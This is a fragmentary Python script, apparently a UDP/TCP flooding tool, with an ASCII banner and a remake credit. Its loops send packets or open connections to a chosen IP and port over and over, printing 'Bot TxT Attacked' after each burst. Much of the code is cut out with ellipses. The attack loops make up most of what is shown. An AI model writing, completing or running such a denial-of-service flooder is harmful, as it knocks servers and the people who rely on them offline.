...
░░░╚═╝░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝╚═╝╚═╝░░╚═╝╚═╝╚═╝╚═╝░░░╚═╝░░░╚═╝╚═╝╚═════╝░
    ...
    | Remake Codes By  T.A.I.X.I.T.ID |
        |Methods = UDP or TCP|
""")
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print("  Bot TxT Attacked %s Server %s"%(ip,port))
		except:
			print("  Bot TxT Attacked %s Server %s"%(ip,port))
...
def tcp():
	...
	while True:
		try:
			...
			s.close()
			print("\033[1;31;40m 0xF1 Bot TxT Attacked %s Server %s"%(ip,port))
